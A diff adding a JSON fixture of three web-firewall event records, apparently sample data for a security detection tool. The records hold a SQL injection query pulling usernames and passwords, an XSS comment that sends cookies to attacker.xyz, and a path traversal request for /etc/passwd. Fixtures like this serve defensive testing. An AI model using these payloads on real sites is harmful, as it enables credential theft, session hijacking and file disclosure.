@@ -1,0 +1,47 @@
+[
+  {
+    "event_id": "evt_sqli_001",
+    "event_type": "http_request",
+    "timestamp": "2026-10-13T10:15:00Z",
+    "source_ip": "198.51.100.45",
+    "user_id": "anonymous",
+    "target": "/api/users?id=1%20UNION%20SELECT%20username,password%20FROM%20users--",
+    "source_module": "waf_collector",
+    "evidence": {
+      "method": "GET",
+      "uri": "/api/users",
+      "query_string": "id=1 UNION SELECT username,password FROM users--",
+      "headers": {"User-Agent": "sqlmap/1.6"}
+    }
+  },
+  {
+    "event_id": "evt_xss_001",
+    "event_type": "http_request",
+    "timestamp": "2026-10-13T10:16:00Z",
+    "source_ip": "198.51.100.45",
+    "user_id": "anonymous",
+    "target": "/comment",
+    "source_module": "waf_collector",
+    "evidence": {
+      "method": "POST",
+      "uri": "/comment",
+      "body": "{\"comment\": \"<script>document.location='http://attacker.xyz/steal?cookie='+document.cookie</script>\"}",
+      "headers": {"User-Agent": "Mozilla/5.0"}
+    }
+  },
+  {
+    "event_id": "evt_traversal_001",
+    "event_type": "http_request",
+    "timestamp": "2026-10-13T10:17:00Z",
+    "source_ip": "198.51.100.45",
+    "user_id": "anonymous",
+    "target": "/download?file=../../../../etc/passwd",
+    "source_module": "waf_collector",
+    "evidence": {
+      "method": "GET",
+      "uri": "/download",
+      "query_string": "file=../../../../etc/passwd",
+      "headers": {"User-Agent": "curl/7.68.0"}
+    }
+  }
+]
